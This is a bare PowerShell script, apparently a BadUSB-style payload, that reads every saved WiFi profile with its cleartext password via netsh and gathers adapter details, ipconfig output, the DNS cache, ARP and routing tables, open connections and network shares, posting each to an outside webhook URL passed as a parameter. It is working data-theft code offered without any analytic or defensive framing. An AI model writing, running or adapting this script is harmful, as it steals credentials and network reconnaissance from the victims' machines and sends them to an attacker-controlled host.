param($webhookUrl)

function Send-Data {
    param($title, $data)
    $body = "===== $title =====`r`n$data`r`n`r`n"
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $body -ContentType "text/plain" -UseBasicParsing
}

try {
    # 1. WiFi Saved Passwords
    $wifiProfiles = netsh wlan show profiles | Select-String ":" | ForEach-Object {
        $name = ($_ -split ":")[1].Trim()
        $details = netsh wlan show profile name="$name" key=clear
        $password = $details | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
        $auth = $details | Select-String "Authentication" | ForEach-Object { ($_ -split ":")[1].Trim() }
        $cipher = $details | Select-String "Cipher" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if($password) { "$name | Auth: $auth | Cipher: $cipher | Pass: $password" }
        elseif($details -match "No profile") { "$name | No saved password" }
    }
    Send-Data "WIFI PROFILES" ($wifiProfiles -join "`r`n")

    # 2. Network Adapters
    $network = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object Name, InterfaceDescription, MacAddress, LinkSpeed | Format-List | Out-String
    Send-Data "NETWORK ADAPTERS" $network

    # 3. IPConfig /all
    $ipconfig = ipconfig /all | Out-String
    Send-Data "IPCONFIG /ALL" $ipconfig

    # 4. DNS Cache
    $dnsCache = ipconfig /displaydns | Select-String -Pattern "Record Name" | Out-String
    Send-Data "DNS CACHE" $dnsCache

    # 5. ARP Table
    $arpTable = arp -a | Out-String
    Send-Data "ARP TABLE" $arpTable

    # 6. Routing Table
    $routeTable = route print | Out-String
    Send-Data "ROUTING TABLE" $routeTable

    # 7. Netstat Connections
    $netstat = netstat -an | Select-String -Pattern "ESTABLISHED|LISTENING" | Out-String
    Send-Data "NETSTAT CONNECTIONS" $netstat

    # 8. Network Shares
    $shares = net share | Select-String -Pattern "Disk" | Out-String
    Send-Data "NETWORK SHARES" $shares

} catch {
    Send-Data "ERROR" $_.Exception.Message
}
